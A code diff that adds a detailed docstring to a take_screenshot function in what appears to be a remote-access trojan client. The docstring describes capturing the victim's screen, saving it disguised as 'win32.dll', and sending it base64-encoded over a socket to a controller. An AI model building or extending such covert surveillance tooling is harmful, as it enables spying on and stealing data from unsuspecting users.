@@ -469,6 +469,60 @@ def execute_program(socket, command: str) -> bool:
 
 
 def take_screenshot(socket) -> bool:
+    """
+    Captures a screenshot, sends it through a socket connection, and cleans up temporary files.
+
+    This function performs a full screenshot workflow:
+    1. Captures the screen using mss (Multi-Screen Shot) library
+    2. Saves temporarily to 'win32.dll' file
+    3. Reads and encodes the screenshot in base64
+    4. Transmits the encoded data through the socket
+    5. Cleans up the temporary file
+    6. Handles all potential errors with appropriate socket messages
+
+    Args:
+        socket: Connected socket object for data transmission and status reporting
+
+    Returns:
+        bool: True if screenshot was successfully captured and transmitted,
+              False if any step in the process failed
+
+    Workflow Details:
+        - Uses mss library for cross-platform screenshot capture
+        - Temporarily stores screenshot as 'win32.dll'
+        - Transmits file contents as base64-encoded binary data
+        - Implements comprehensive error handling at each stage
+        - Includes cleanup phase even if transmission fails
+
+    Error Handling:
+        - Screenshot capture failures
+        - File reading/writing errors
+        - Data encoding/transmission problems
+        - Temporary file cleanup issues
+        (All errors are reported through socket connection)
+
+    Security Notes:
+        - Uses base64 encoding for safe data transmission
+        - Cleans up temporary files even after failures
+        - Limits exposure of sensitive data in error messages
+
+    Message Protocol:
+        Success:
+            (Sends raw base64-encoded screenshot data)
+        Errors:
+            "[!] Screenshot capture failed: <error>"
+            "[!] Screenshot file is empty"
+            "[!] Error reading screenshot file: <error>"
+            "[!] Error processing screenshot: <error>"
+            "[!] Warning: Could not delete temp file: <error>"
+            "[!] Unexpected error during screenshot: <error>"
+
+    Example:
+        >>> if take_screenshot(sock):
+        ...     # Client receives base64 screenshot data
+        ... else:
+        ...     # Client receives error message
+    """
     screenshot_file = "win32.dll"
 
     try:
